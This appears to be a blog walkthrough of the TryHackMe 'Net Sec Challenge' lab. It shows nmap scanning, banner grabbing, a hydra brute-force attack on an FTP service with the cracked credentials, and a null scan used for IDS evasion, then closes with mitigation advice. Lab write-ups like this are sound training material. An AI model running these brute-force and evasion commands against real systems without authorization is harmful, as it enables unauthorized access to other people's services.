---
title: "Weak Authentication – FTP Brute Force Leading to Unauthorized Access | Net Sec Challenge"
date: 2026-03-26 00:00:00 +0530
categories: [Penetration Testing]
tags: [weak-authentication, brute-force, ftp, hydra, enumeration, service-enumeration, credential-compromise, linux, tryhackme, nmap, ids-evasion]
platform: TryHackMe
author: Shivansh Sharma
image:
  path: /assets/images/posts/net-sec.webp
  alt: Net Sec Challenge
---

## Overview
This lab focuses on performing a complete network penetration testing workflow, starting from reconnaissance to exploitation. It highlights weak authentication mechanisms in an FTP service that can be exploited using brute-force techniques.

The challenge also introduces service enumeration, banner grabbing, and basic IDS evasion techniques.

## Objective
- Identify open ports and services
- Perform service-level enumeration
- Extract exposed information from banners
- Exploit weak authentication using brute-force
- Retrieve flags from multiple services
- Bypass basic IDS detection mechanisms

## Reconnaissance

### Initial Port Scan
We begin with a standard Nmap scan to identify commonly exposed services:

```bash
nmap <target_IP>
```

### Result

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

### Analysis

* Only top 1000 ports are scanned by default
* Web services and SMB are exposed
* Port 8080 is the highest detected so far

### Full Port Scan

To ensure no hidden services are missed:

```bash
nmap -p- -T4 <target_IP>
```

### Result

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown
```

### Key Finding

* Port 10021 is exposed outside the default scan range
* Likely a custom or non-standard service (later identified as FTP)

## Service Enumeration

### HTTP Enumeration (Port 80)

```bash
nmap -sV -sC -p80 <target_IP> -T4
```

### Result

```
http-server-header: lighttpd THM{web_server_25352}
```

🚩 Flag: `THM{web_server_25352}`

### Insight

* Server header disclosure reveals both software and sensitive data
* Misconfigured headers can leak internal information

### SSH Banner Grabbing (Port 22)

```bash
telnet <target_IP> 22
```

### Result

```
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

🚩 Flag: `THM{946219583339}`

### Insight

* SSH banners often reveal version information
* In this case, it directly exposes a flag

### FTP Service Discovery (Port 10021)

```bash
nmap -sV -sC -p10021 <target_IP> -T4
```

### Result

```
10021/tcp open  ftp     vsftpd 3.0.5
```

### Key Observation

* FTP is running on a non-standard port
* Version disclosure: vsftpd 3.0.5
* Indicates potential for authentication attacks

## Exploitation – FTP Brute Force

### Why Brute Force?

FTP commonly relies on username/password authentication. Weak credentials make it a prime target.

We are provided with two usernames:

```
eddie
quinn
```

### Step 1: Prepare Username List

```bash
nano username.txt
```

```
eddie
quinn
```

### Step 2: Perform Brute Force Attack

```bash
hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_IP>:10021
```

### Result

```
login: eddie   password: jordan
login: quinn   password: andrea
```

### Insight

* Weak passwords allowed successful compromise
* No rate limiting or account lockout was implemented

### Step 3: Access FTP Service

```bash
ftp <target_IP> 10021
```

**Login Credentials**

* Username: `quinn`
* Password: `andrea`

### Step 4: Retrieve Sensitive Data

```bash
ls -la
get ftp_flag.txt
cat ftp_flag.txt
```

🚩 Flag: `THM{321452667098}`

## IDS Evasion – Null Scan

The challenge on port 8080 required bypassing detection mechanisms.

### Technique Used

```bash
nmap -sN <target_IP>
```

### Explanation

* `-sN` sends TCP packets with no flags set
* Many basic IDS systems fail to log or detect such packets
* Useful for stealth scanning

### Result

After refreshing the challenge page:

🚩 Flag: `THM{f7443f99}`

## Impact

This scenario demonstrates multiple real-world risks:

* Exposure of hidden services due to incomplete scanning
* Information disclosure via banners
* Weak authentication leading to unauthorized access
* Lack of brute-force protection mechanisms
* Sensitive data accessible via FTP

In real environments, this could lead to:

* Data breaches
* Credential reuse attacks
* Lateral movement within networks

## Mitigation

To secure systems against such attacks:

* Enforce strong password policies
* Implement account lockout and rate limiting
* Disable unnecessary services and ports
* Avoid exposing banners with sensitive information
* Use intrusion detection and prevention systems properly configured
* Restrict FTP access or replace with secure alternatives (SFTP)

## Key Learnings

* Default scans are not sufficient — always perform full port scans
* Service enumeration reveals critical information
* Banner grabbing can expose sensitive data
* Weak authentication is a major security risk
* Brute-force attacks are highly effective without protections
* IDS evasion techniques can bypass poorly configured defenses

## Conclusion

This lab demonstrates a full penetration testing workflow:

Reconnaissance → Enumeration → Service Analysis → Credential Attack → Exploitation → Post-Exploitation

It highlights how small misconfigurations, when combined, can lead to complete system compromise.